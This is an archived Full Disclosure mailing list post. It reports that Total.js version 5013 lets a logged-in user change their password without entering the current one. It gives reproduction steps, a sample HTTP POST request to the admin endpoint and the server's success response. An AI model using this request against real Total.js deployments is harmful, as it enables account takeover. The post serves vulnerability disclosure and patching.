---
title: Current Password not Required When Changing Password -	totaljsv5013
url: https://seclists.org/fulldisclosure/2025/Oct/24
source: Full Disclosure
date: 2025-10-29
fetch_date: 2025-10-30T03:13:01.217728
---

# Current Password not Required When Changing Password -	totaljsv5013

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](25)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](25)

![](/shared/images/nst-icons.svg#search)

# Current Password not Required When Changing Password - totaljsv5013

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 26 Oct 2025 17:34:19 +0000

---

```
# Exploit Title: Current Password not Required When Changing Password -
totaljsv5013
# Date: 10/2025
# Exploit Author: Andrey Stoykov
# Version: 5013
# Tested on: Debian 12
# Blog:
https://msecureltd.blogspot.com/2025/10/friday-fun-pentest-series-43-current.html

Current Password not Required When Changing Password:

Steps to Reproduce:
1. Login with user and click on profile icon
2. Select "Change Credentials"
3. The user would not be required to enter current password for updating
the current password

// HTTP POST Request - Changing Password

POST /admin/ HTTP/1.1
Host: 192.168.58.153
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0)
Gecko/20100101 Firefox/145.0
[...]

{"schema":"admin_save","data":{"name":"John
Connor","login":"gz82g8WYq3","password":"Passw0rd!"}}

// HTTP Response - Changing Password

HTTP/1.1 200 OK
set-cookie:
NPgdS=13030-39383d41540751460a15064b0f7449766a261756481745550d1f5f05414b061f5e6456343a630323750702160307415f584656405e390e3e38360e591d471c0619711511121d111f4f3a023530306156510b014f0d5045;
Expires=Wed, 26 Nov 2025 16:25:39 GMT; Path=/; SameSite=Lax
content-type: application/json; charset=utf-8
cache-control: private, no-cache, no-store, max-age=0
vary: Accept-Encoding, Last-Modified, User-Agent
expires: -1
x-powered-by: Total.js
Date: Sun, 26 Oct 2025 16:25:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 16

{"success":true}
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](25)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](25)

### Current thread:

* **Current Password not Required When Changing Password - totaljsv5013** *Andrey Stoykov (Oct 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")